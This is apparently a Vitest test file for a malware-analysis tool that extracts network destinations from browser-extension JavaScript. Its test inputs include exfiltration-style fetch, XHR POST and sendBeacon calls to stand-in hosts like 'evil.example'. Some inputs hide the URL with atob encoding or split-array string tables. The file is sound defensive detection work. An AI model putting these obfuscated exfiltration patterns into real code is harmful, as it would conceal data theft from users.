import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { analyzeScript } from "../src/pipeline/layer3-ast/index.ts";

const src = (sample: string, file: string) => readFileSync(`corpus/${sample}/extension/${file}`, "utf8");

describe("Layer 3a — network destinations", () => {
  it("records the static exfil host in mutant A", () => {
    const s = analyzeScript("js/background.js", src("mutant-a-exfil-fetch", "js/background.js"));
    const d = s.network_destinations.find((x) => x.value.includes("collect.evil-analytics-cdn.invalid"));
    expect(d).toBeDefined();
    expect(d!.kind).toBe("static");
  });

  it("records a template-literal destination as a skeleton with a dynamic marker", () => {
    const s = analyzeScript("js/x.js", "const u = `https://api.example.com/v1/${user}`; fetch(u);");
    const d = s.network_destinations.find((x) => x.value.includes("api.example.com"));
    expect(d).toBeDefined();
    expect(d!.kind).toBe("template");
    expect(d!.value).toContain("${");
  });

  it("does not crash on a file with no destinations", () => {
    const s = analyzeScript("js/common-utils.js", src("demo-cookie-manager", "js/common-utils.js"));
    expect(Array.isArray(s.network_destinations)).toBe(true);
  });
});

// Improvement 007 — the XHR URL lives on .open(method, url), not the constructor.
describe("Layer 3a — XHR open / sendBeacon destinations (007)", () => {
  const run = (code: string) => analyzeScript("js/x.js", code);

  it("captures a literal XHR URL with the xhr-open role", () => {
    const s = run('const x = new XMLHttpRequest(); x.open("POST", "https://evil.example/x")');
    const d = s.network_destinations.find((d) => d.ast_role === "xhr-open");
    expect(d).toBeDefined();
    expect(d!.value).toBe("https://evil.example/x");
    expect(d!.kind).toBe("static");
  });

  it("folds a concatenated XHR URL (pass-2 constant folding)", () => {
    const s = run('const x = new XMLHttpRequest(); x.open("POST", "https://" + "evil.example" + "/x")');
    const d = s.network_destinations.find((d) => d.ast_role === "xhr-open");
    expect(d?.kind).toBe("static");
    expect(d?.value).toBe("https://evil.example/x");
  });

  it("recovers an atob-encoded XHR URL", () => {
    // atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUv") === "https://evil.example/"
    const s = run('const r = new XMLHttpRequest(); r.open("GET", atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUv"))');
    expect(s.network_destinations.find((d) => d.ast_role === "xhr-open")?.kind).toBe("static");
  });

  it("records an unresolvable XHR URL as unknown (feeds the ledger)", () => {
    const s = run('function go(x, server){ x.open("GET", server) }');
    expect(s.network_destinations.some((d) => d.ast_role === "xhr-open" && d.kind === "unknown")).toBe(true);
  });

  it("does not treat indexedDB.open / caches.open as XHR", () => {
    const s = run('indexedDB.open("mydb", 2); caches.open("v1")');
    expect(s.network_destinations.some((d) => d.ast_role === "xhr-open")).toBe(false);
  });

  it("folds a concatenated sendBeacon URL", () => {
    const s = run('navigator.sendBeacon("https://" + "beacon.evil" + "/b", data)');
    const d = s.network_destinations.find((d) => d.ast_role === "sendBeacon.url");
    expect(d?.kind).toBe("static");
    expect(d?.value).toBe("https://beacon.evil/b");
  });
});

// Improvement 020 — a host hidden behind a split-array string table + accessor
// (the Click&Clean obfuscation) must resolve, and it must resolve even when the
// fetch goes through a user-defined wrapper the sink list does not recognize.
describe("Layer 3a — split-array decoder + wrapper-assembled URLs (020)", () => {
  const run = (code: string) => analyzeScript("js/x.js", code);

  it("decodes g(i)+g(j) built from a .split() string table", () => {
    const s = run('const V="https:// api64 .com".split(" ");const g=a=>V[a];fetch(g(0)+g(1)+g(2)+"/upd2");');
    const d = s.network_destinations.find((d) => d.value === "https://api64.com/upd2");
    expect(d).toBeDefined();
    expect(d!.kind).toBe("static");
  });

  it("decodes a function-expression accessor and direct array indexing", () => {
    const s = run('const V=["https://","api64",".com"];const g=function(a){return V[a]};fetch(g(0)+V[1]+g(2)+"/dbge");');
    expect(s.network_destinations.some((d) => d.value === "https://api64.com/dbge")).toBe(true);
  });

  it("recovers a concatenated URL passed to a user-defined wrapper, not just fetch()", () => {
    // H is a fetch wrapper — the sink list does not know it, but the URL is still recorded.
    const s = run('const H=(u,o)=>self.fetch(u,o);H("https://" + "evil.example" + "/x", {method:"POST"});');
    const d = s.network_destinations.find((d) => d.value === "https://evil.example/x");
    expect(d).toBeDefined();
    expect(d!.kind).toBe("static");
  });

  it("records the full URL once (top of the + chain), not each fragment", () => {
    const s = run('sink("https://" + "evil.example" + "/a/b");');
    const evil = s.network_destinations.filter((d) => d.value.includes("evil.example"));
    expect(evil.map((d) => d.value)).toEqual(["https://evil.example/a/b"]);
  });

  it("leaves a genuinely dynamic accessor index unresolved (no false host)", () => {
    const s = run('const V="https:// api64 .com".split(" ");const g=a=>V[a];fetch(g(i)+g(1)+"/x");');
    expect(s.network_destinations.some((d) => d.value === "https://api64.com/x")).toBe(false);
  });
});
